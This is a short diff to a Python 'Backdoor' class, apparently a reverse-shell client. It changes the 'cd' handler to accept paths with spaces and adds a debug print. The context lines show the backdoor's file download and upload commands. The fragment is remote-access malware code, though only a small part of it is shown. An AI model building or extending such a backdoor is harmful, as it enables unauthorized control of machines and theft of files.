@@ -54,7 +54,14 @@ class Backdoor:
 					self.connection.close()
 					sys.exit()
 				elif command[0] == "cd" and len(command) > 1:
-					command_result = self.change_working_directory_to(command[1])
+					path = ""
+					if len(command) > 2:
+						for x in range(1, len(command)):
+							path = path + command[x] + " "
+					else:
+						path = command[1]
+					print(path)
+					command_result = self.change_working_directory_to(path)
 				elif command[0] == "download":
 					command_result = self.read_file(command[1])
 				elif command[0] == "upload":
